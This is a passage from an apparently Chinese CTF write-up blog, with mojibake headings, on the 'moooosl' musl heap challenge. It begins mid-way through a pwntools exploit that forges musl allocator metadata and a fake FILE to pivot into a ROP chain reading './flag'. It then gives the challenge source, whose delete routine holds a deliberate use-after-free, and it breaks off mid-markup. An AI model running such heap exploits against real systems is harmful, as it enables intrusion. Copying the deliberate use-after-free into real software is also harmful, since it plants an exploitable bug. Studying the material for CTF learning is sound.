class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¢˜ç›®ä¸º<code>defcon 2023 moooosl</code><br>muslç‰ˆæœ¬ä¸º1.2.2</p><h3 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><p>èµ›é¢˜å¥½åƒæ²¡æœ‰ç»™å‡ºæºç ï¼Œä¸è¿‡ä»£ç æ¯”è¾ƒç®€å•ï¼Œ<code>ida</code>çœ‹çš„åè€Œæ¯”æºç æ›´åŠ æ–¹ä¾¿ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿çœ‹çš„äººäº†è§£é¢˜ç›®ï¼Œå°±æŠŠæºç è´´å‡ºæ¥äº†<br>h.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> H[<span class="number">0x100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">uint32_t</span> shift = rand();</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R 0x7f</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> a = L; a &lt; R; a++) &#123;</span><br><span class="line">        tmp[<span class="number">0</span>] = a;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> b = L; b &lt; R; b++) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c = L; c &lt; R; c++) &#123;</span><br><span class="line">                tmp[<span class="number">2</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> d = L; d &lt; R; d++) &#123;</span><br><span class="line">                    tmp[<span class="number">3</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">char</span> e = L; e &lt; R; e++) &#123;</span><br><span class="line">                        tmp[<span class="number">4</span>] = e;</span><br><span class="line">                        <span class="type">uint32_t</span> h = key_hash(&amp;tmp, <span class="number">5</span>) - shift;</span><br><span class="line">                        <span class="keyword">if</span> (h &lt; <span class="number">0x100000</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (H[h] == <span class="number">0</span>) &#123;</span><br><span class="line">                                H[h] = *(<span class="type">uint64_t</span> *)&amp;tmp;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;%s %s =&gt; %#08x\n&quot;</span>, tmp, &amp;H[h], h);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recvuntil</span><span class="params">(<span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">if</span> (read(<span class="number">0</span>, &amp;c, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">char</span> *)buf)[i] = c;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            ((<span class="type">char</span> *)buf)[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">readint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    recvuntil(&amp;buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_key</span><span class="params">(<span class="type">uint8_t</span> **key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> key_size = readint();</span><br><span class="line">    *key = <span class="built_in">calloc</span>(<span class="number">1</span>, key_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*key, key_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_value</span><span class="params">(<span class="type">uint8_t</span> **value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> value_size = readint();</span><br><span class="line">    *value = <span class="built_in">calloc</span>(<span class="number">1</span>, value_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*value, value_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> *key;</span><br><span class="line">    <span class="type">uint8_t</span> *value;</span><br><span class="line">    <span class="type">size_t</span> key_size;</span><br><span class="line">    <span class="type">size_t</span> value_size;</span><br><span class="line">    <span class="type">uint64_t</span> hash;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">// struct node *prev;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">2021</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">value_dump</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MASK (HASH_SIZE - 1)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">list_heads</span>[<span class="title">HASH_SIZE</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: query&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;option: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> node *<span class="title function_">lookup</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = key_hash(key, key_size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">struct</span> node *n = list_heads[h &amp; HASH_MASK]; n; n = n-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n-&gt;hash == h &amp;&amp; n-&gt;key_size == key_size &amp;&amp; !<span class="built_in">memcmp</span>(key, n-&gt;key, key_size)) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">node</span> =</span> <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">    node-&gt;key_size = read_key(&amp;node-&gt;key);</span><br><span class="line">    <span class="comment">// always insert to the head, don&#x27;t check duplicated entries</span></span><br><span class="line">    node-&gt;value_size = read_value(&amp;node-&gt;value);</span><br><span class="line">    node-&gt;hash = key_hash(node-&gt;key, node-&gt;key_size);</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> h = node-&gt;hash &amp; HASH_MASK;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span> =</span> list_heads[h];</span><br><span class="line">    list_heads[h] = node;</span><br><span class="line">    node-&gt;next = next;</span><br><span class="line">    <span class="comment">// node-&gt;prev = NULL;</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">query</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value_dump(n-&gt;value, n-&gt;value_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> node **p = &amp;list_heads[n-&gt;hash &amp; HASH_MASK];</span><br><span class="line">        <span class="keyword">if</span> (*p == n || n-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// above condition is buggy</span></span><br><span class="line">            <span class="comment">// remove `n` from the linked list</span></span><br><span class="line">            <span class="keyword">while</span> (*p != n) &#123;</span><br><span class="line">                p = &amp;(*p)-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            *p = n-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// uaf: if `n` is at the tail of the linked list</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;value);</span><br><span class="line">        <span class="built_in">free</span>(n);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> op = readint();</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                store();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                query();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 